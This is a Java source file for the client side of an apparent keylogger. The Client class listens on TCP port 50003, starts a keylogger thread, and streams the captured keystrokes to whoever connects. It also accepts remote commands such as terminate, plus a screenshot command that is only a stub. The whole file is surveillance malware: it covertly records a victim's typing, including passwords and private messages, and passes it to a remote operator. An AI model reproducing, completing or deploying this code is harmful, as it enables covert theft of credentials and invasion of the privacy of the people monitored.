package tk.arktech;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.TimeUnit;

public class Client implements Runnable {

    public final int commandNumber = 1;
    public final int listenerNumber = 2;
    public BlockingQueue<String> keyloggerCommandsQueue = new ArrayBlockingQueue<String>(20);
    public BlockingQueue<String> commandQueue = new ArrayBlockingQueue<String>(20);
    public BlockingQueue<String> dataQueue = new ArrayBlockingQueue<String>(20);
    public InputStream istream;
    public OutputStream ostream;
    public boolean runningFlag = true;


    private void screenshot() {

    }

    private void sendKeyloggerCommand(String st) {
        try {
            keyloggerCommandsQueue.put(st);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    private void send(String st) {
        try {
            ostream.write(st.getBytes());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void sendLoggedText(String st) {
        send("1"+st);
    }

    private void terminate()
    {
        runningFlag = false;
    }

    public void run() {

        ServerSocket svr = null;
        try {
            svr = new ServerSocket(50003);
            Socket connection = svr.accept(); //TODO: wstawić accept we właściwe miejsce

            istream = connection.getInputStream();
            ostream = connection.getOutputStream();

            var tcpListenerThread = new Thread(new TCPListener(commandQueue, connection.getInputStream(), commandNumber), "TCPLiestener");


            var keyloggerThread = new Thread((new Keylogger(dataQueue, keyloggerCommandsQueue, listenerNumber)), "Keylogger");

            var commandParser = new CommandExecutor(this::screenshot, "screenshot");
            commandParser
                    .add(new CommandExecutor(this::terminate, "terminate"))
                    .addEnd(new OneCommandConsumer(this::sendKeyloggerCommand));
            CommandClientParser queueParser = new CommandClientParser(commandParser, commandNumber);

            var sender = new OneCommandConsumer(this::sendLoggedText);
            var dataParser = new CommandClientParser(sender, listenerNumber);

            queueParser.add(dataParser);

            tcpListenerThread.start();
            keyloggerThread.start();

            while(runningFlag)
            {

                    var temp = commandQueue.poll(200, TimeUnit.MILLISECONDS);
                    if(temp!= null) queueParser.handle(temp);
                    temp = dataQueue.poll(200, TimeUnit.MILLISECONDS);
                    if(temp!= null) queueParser.handle(temp);



            }

            keyloggerThread.interrupt();
            keyloggerThread.join();
            tcpListenerThread.interrupt();
            tcpListenerThread.join();

            svr.close();

        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

    }
}
